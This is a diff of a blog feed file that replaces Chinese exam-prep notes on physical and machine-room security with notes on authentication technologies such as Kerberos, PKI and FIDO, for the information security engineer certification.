   </entry>
   <entry>
-    <title>第5章 物理环境安全技术</title>
-    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
+    <title>第6章 认证技术原理应用</title>
+    <url>/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="认证概述"><a href="#认证概述" class="headerlink" title="认证概述"></a>认证概述</h1><p>认证由标识和鉴别两部分组成。</p>
+<h2 id="认证依据"><a href="#认证依据" class="headerlink" title="认证依据"></a>认证依据</h2><p>主要有四类：</p>
+<ol>
+<li>所知道的秘密信息</li>
+<li>所拥有的实物凭证</li>
+<li>所具有的生物特征</li>
+<li>所表现的行为特征</li>
+</ol>
 <a id="more"></a>
-<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
-<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
-<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
-<li>环境物理安全：机房选择、防护</li>
-<li>系统物理安全：存储介质，灾备、访问保护</li>
-</ol>
-<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
-<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
-<ol>
-<li>第一级用户自主保护级提供基本的物理安全保护</li>
-<li>第二级系统审计保护级提供适当的物理安全保护</li>
-<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
-<li>第四级结构化保护级提供更高程度的物理安全保护</li>
-</ol>
-<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
-<li><p><strong> 防火</strong></p>
-<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
+<h2 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h2><p>认证机制又验证对象、认证协议、鉴别实体构成。</p>
+<p>根据认证依据所利用的时间长度，分成一次性口令、持续认证。</p>
+<h1 id="认证类型与认证过程"><a href="#认证类型与认证过程" class="headerlink" title="认证类型与认证过程"></a>认证类型与认证过程</h1><h2 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a>单向认证</h2><ol>
+<li><p>基于共享秘密</p>
+<p>验证者（B）和声称者（A）共享一个秘密$K_{AB}$，$ID_A$为实体A的标识，A发送两者给B，B进行验证并回复给A</p>
 </li>
-<li><p><strong>防水</strong></p>
-<p>不要把机房设置在楼房底层或地下室</p>
-</li>
-<li><p><strong>防震</strong></p>
-</li>
-<li><p><strong>防盗</strong></p>
-<p>报警器和监控、物理访问控制</p>
-</li>
-<li><p><strong>防鼠虫害</strong></p>
-<p>危害：咬坏电缆或引起电源短路</p>
-</li>
-<li><p><strong>防雷</strong></p>
-<p>避雷针及专用防雷设施，设备接地</p>
-</li>
-<li><p><strong>防电磁</strong></p>
-<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
-</li>
-<li><p><strong>防静电</strong></p>
-<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
-</li>
-<li><p><strong>安全供电</strong></p>
-<p>专用电线路、不间断电源（UPS）、备用发电机</p>
+<li><p>基于挑战的响应</p>
+<p>验证者B生成一个随机数$R_B$，$ID_A$为实体A的标识，$ID_B$为实体A的标识，B向A发送消息（$ID_B$，$R_B$）。A收到消息后，生成包含随机数$R_B$的秘密$K_{AB}$，并发送（$ID_A$，$K_{AB}$）给B，B收到后，解密$K_{AB}$，检查$R_B$是否正确，并回复给A。</p>
 </li>
 </ol>
-<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
-<ol>
-<li>主要工作房间：主机房、终端室等；</li>
-<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
-<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
-<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
-</ol>
-<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
+<h2 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h2><p>双方互相认证。</p>
+<p><img src="/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/双向认证.jpg" alt></p>
+<h2 id="第三方认证"><a href="#第三方认证" class="headerlink" title="第三方认证"></a>第三方认证</h2><p>实体A和实体B与第三方共享密钥$K_{PA}$，$K_{PB}$，实体A发送认证请求时，向第三方申请实体AB的密钥$K_{AB}$，然后A和B使用$K_{AB}$加密保护双方的认证信息。</p>
+<p><img src="/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/第三方认证.jpg" alt></p>
+<h1 id="认证技术方法"><a href="#认证技术方法" class="headerlink" title="认证技术方法"></a>认证技术方法</h1><h2 id="口令认证技术"><a href="#口令认证技术" class="headerlink" title="口令认证技术"></a>口令认证技术</h2><p>主要攻击方式：窃听、重放、中间人攻击、口令猜测</p>
+<p>口令认证安全：加密存储、安全传输、符合协议设计要求、避免弱口令</p>
+<h2 id="智能卡技术"><a href="#智能卡技术" class="headerlink" title="智能卡技术"></a>智能卡技术</h2><p><img src="/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/智能卡技术.jpg" alt></p>
+<h2 id="基于生物特征认证技术"><a href="#基于生物特征认证技术" class="headerlink" title="基于生物特征认证技术"></a>基于生物特征认证技术</h2><p>生物特征：指纹、人脸、视网膜、语音</p>
+<p><strong>虹膜识别的错误率是各种生物特征识别中最低的</strong></p>
+<h2 id="Kerberos认证技术"><a href="#Kerberos认证技术" class="headerlink" title="Kerberos认证技术"></a>Kerberos认证技术</h2><p>四个基本实体</p>
 <ul>
-<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
-<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
-<li>C：不属于A、B级的情况</li>
+<li>Kerberos客户机，用户用来访问服务器设备</li>
+<li>AS（认证服务器），识别用户身份并提供TGS会话密钥</li>
+<li>TGS（票据发放服务器），为申请服务的用户授予票据</li>
+<li>应用服务器，为用户提供服务的设备或系统</li>
 </ul>
-<p>安全级别要求：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
-<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
-<li><p>环境安全性</p>
-<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
-</li>
-<li><p>地质可靠性</p>
-<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
-</li>
-<li><p>场地抗电磁干扰性</p>
-<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
-</li>
-<li><p>应避开强振动源和强噪音源</p>
-<p>避开：振动源、机场、主要道路</p>
-</li>
-<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
-</li>
-</ol>
-<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
-<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
-<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
-<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
-</ul>
-<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
-<ul>
-<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
-<li>耐火等级不应低于二级（13.2.1）</li>
-<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
-<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
-<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
-</ul>
-<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
-<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
-<ul>
-<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
-<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
-</ul>
-<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
+<p>kerberos V5认证协议主要由六步构成（AS与TGS统称为KDC）</p>
+<p><img src="/2020/09/17/%E7%AC%AC6%E7%AB%A0-%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8/Kerberos工作流程.jpg" alt></p>
 <ol>
-<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
-<li>所有人员应佩戴标识身份的证明</li>
-<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
-<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
-<li>保护设备免于电源故障或网络通信异常影响</li>
-<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
-<li>制定相关安全检查、监督策略。</li>
+<li>Kerberos客户（已知自己用户名密码）向AS（已知所有用户和服务名所有密码）申请票据TGT</li>
+<li>当AS收到Kerberos客户消息后，在认证数据库检查确认后产生一个会话密钥，同时使用客户秘密密钥对会话密钥加密，生成票据TGT（实体名、地址、时间戳、限制时间、会话密钥组成）。然后发送给Kerberos客户。</li>
+<li>Kerberos客户收到TGT后，使用自己的秘密密钥解密得到会话密钥，利用解密的信息重新构造认证请求单，向TGS发送请求，申请访问应用服务器AP所需的票据。</li>
+<li>TGS使用其秘密密钥对TGT进行解密，同时使用TGT中的会话密钥对Kerberos客户对请求认证单信息进行解密，并将解密后的信息与TGT中信息进行比较。然后TGS生成新的会话密钥以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。最后，生成一个票据TGT（由客户的实体名、地址、时间戳、限制时间、会话密钥组成），将TGT发送给Kerberos客户。</li>
+<li>Kerberos客户收到TGS响应后，获得与应用服务器共享的会话密钥。此时，Kerberos客户生成一个新的用于访问应用服务器的认证单，并用与应用服务器共享的会话密钥加密，然后与TGS发送来的票据一并传送到应用服务器。</li>
 </ol>
-<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
+<p>优点：</p>
 <ul>
-<li>网络通信线路被切断</li>
-<li>网络通信线路被电磁干扰</li>
-<li>网络通信线路泄漏信息</li>
+<li>显著减少用户密钥的密文暴露次数，减少公交站对有关用户密钥对密文积累</li>
+<li>具有单点登录的优点，只要TGT未过期，认证过程就不必重新输入密码</li>
 </ul>
-<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
+<p>缺点：</p>
 <ul>
-<li>网络通信设备：采取设备冗余</li>
-<li>网络通信线路：采取多路通信</li>
+<li>若服务器时间发送错误，则整个Kerberos认证系统将会瘫痪</li>
 </ul>
-<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
-<li>设备实体环境关联安全威胁</li>
-<li>设备实体被盗取或损害</li>
-<li>设备实体受到电磁干扰</li>
-<li>设备供应链条中断或延缓</li>
-<li>设备实体的固件部分遭受攻击</li>
-<li>设备遭受硬件攻击</li>
-<li>设备实体的控制组件安全威胁</li>
-<li>设备非法外联</li>
-</ol>
-<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
+<h2 id="公钥基础设施（PKI）技术"><a href="#公钥基础设施（PKI）技术" class="headerlink" title="公钥基础设施（PKI）技术"></a>公钥基础设施（PKI）技术</h2><p>PKI主要安全服务：身份认证、完整性保护、数字签名、会话加密管理、密钥恢复</p>
+<p>PKI各实体的功能分别叙述如下：</p>
+<ul>
+<li>CA：证书授权机构，主要进行证书的颁发、废止和更新；认证机构负责签发、管理和撤销一组终端用户的证书</li>
+<li>RA：证书登记权威机构，将公钥和对应的证书持有者的身份及其他属性联系起来，进行注册和担保；RA可以充当CA和他的终端用户之间的中间实体，辅助CA完成其他绝大部分的证书处理功能</li>
+<li>目录服务器：CA通常使用一个目录服务器，提供证书管理和分发的服务</li>
+<li>终端实体：指需要认证的对象，如服务器、E-mail地址</li>
+<li>客户端：指需要基于PKI安全服务的使用者，包括用户、服务进程等</li>
+</ul>
+<h2 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h2><p>使用不同系统时，只需要进行一次身份认证。</p>
+<h2 id="基于人机识别认证技术"><a href="#基于人机识别认证技术" class="headerlink" title="基于人机识别认证技术"></a>基于人机识别认证技术</h2><p>区别计算机和人的操作，称为CAPTCHA技术。主要包括：文本、图像、语音等</p>
+<h2 id="多因素认证技术"><a href="#多因素认证技术" class="headerlink" title="多因素认证技术"></a>多因素认证技术</h2><p>多种鉴别信息进行组合</p>
+<h2 id="基于行为的身份鉴别技术"><a href="#基于行为的身份鉴别技术" class="headerlink" title="基于行为的身份鉴别技术"></a>基于行为的身份鉴别技术</h2><p>根据用户行为和风险大小而进行的身份鉴别技术。动态监控用户状态以判定用户身份。</p>
+<h2 id="快速在线认证（FIDO）"><a href="#快速在线认证（FIDO）" class="headerlink" title="快速在线认证（FIDO）"></a>快速在线认证（FIDO）</h2><p>使用标准公钥加密技术来提供强身份验证。</p>
 <ol>
-<li>设备的标志和标记</li>
-<li>设备电磁辐射防护</li>
-<li>设备静电及用电安全防护</li>
-<li>设备磁场抗扰</li>
-<li>设备环境安全保护</li>
-<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
+<li><p>登记注册</p>
+<p>创建公私钥，公钥注册到在线服务。</p>
+</li>
+<li><p>登录使用</p>
+<p>验证方法：安全PIN、生物识别以及符合FIDO标准要求的认证设备。</p>
+</li>
 </ol>
-<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
-<ol>
-<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
-<li>硬件漏洞处理</li>
-</ol>
-<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
-<ol>
-<li>存储管理失效</li>
-<li>存储数据泄密</li>
-<li>存储介质及存储设备故障</li>
-<li>存储介质数据非安全删除</li>
-<li>恶意代码攻击</li>
-</ol>
-<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
-<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
-<li>数据存储加密保存</li>
-<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
-</ol>
+<h1 id="认证主要产品与技术指标"><a href="#认证主要产品与技术指标" class="headerlink" title="认证主要产品与技术指标"></a>认证主要产品与技术指标</h1><h2 id="认证主要产品"><a href="#认证主要产品" class="headerlink" title="认证主要产品"></a>认证主要产品</h2><p>产品类型：系统安全增强、生物认证、电子认证服务、网络准入控制、身份认证网关</p>
+<h2 id="主要技术指标"><a href="#主要技术指标" class="headerlink" title="主要技术指标"></a>主要技术指标</h2><p>评价指标分成三类：安全功能要求、性能要求和安全保障要求</p>
+<p>技术指标：密码算法支持、认证准确性、用户支持数量、安全保障级别</p>
+<h1 id="认证技术应用"><a href="#认证技术应用" class="headerlink" title="认证技术应用"></a>认证技术应用</h1><p>常见应用场景：用户身份验证、信息来源证实、信息安全保护</p>
+<p>校园网、网络路由、机房门禁、公民网络电子身份标识、HTTP等方面认证技术应用参考详见P134-139</p>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
